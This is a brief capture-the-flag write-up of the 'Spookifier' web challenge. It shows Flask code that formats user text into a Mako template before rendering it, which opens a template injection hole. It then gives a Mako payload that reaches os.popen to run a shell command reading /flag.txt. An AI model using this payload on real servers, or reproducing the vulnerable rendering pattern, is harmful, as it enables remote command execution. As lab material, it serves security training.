# [Web] Spookifier

This web application that uses a templates to change the font of an input text. As a template is used, this calls for SSTI.
We do have access to the code and the template engine used is Mako, via `flask_mako`.

```python
@web.route('/')
def index():
    text = request.args.get('text')
    if(text):
        converted = spookify(text)
        return render_template('index.html',output=converted)
```

Especially the `spookify` function calls a `generate_render` function:

```python
def generate_render(converted_fonts):
        result = '''
                <tr>
                        <td>{0}</td>
        </tr>
                <tr>
                <td>{1}</td>
        </tr>
                <tr>
                <td>{2}</td>
        </tr>
                <tr>
                <td>{3}</td>
        </tr>
        '''.format(*converted_fonts)
        return Template(result).render()
```

We can abuse it using one of the payloads found on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#mako)

```python
${self.module.cache.util.os.popen("cat /flag.txt").read()}
```
